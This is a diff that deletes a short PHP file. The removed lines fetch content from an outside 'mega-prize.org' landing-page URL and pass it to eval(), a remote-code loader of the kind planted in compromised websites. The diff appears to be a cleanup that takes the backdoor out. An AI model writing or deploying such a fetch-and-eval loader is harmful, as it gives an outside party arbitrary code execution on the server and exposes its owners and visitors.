@@ -1,6 +1,0 @@
-<?php
-
-$content = file_get_contents(urldecode('https://mega-prize.org/landing/eganda.html'));
-
-$content = "?> ".$content;
-eval($content);
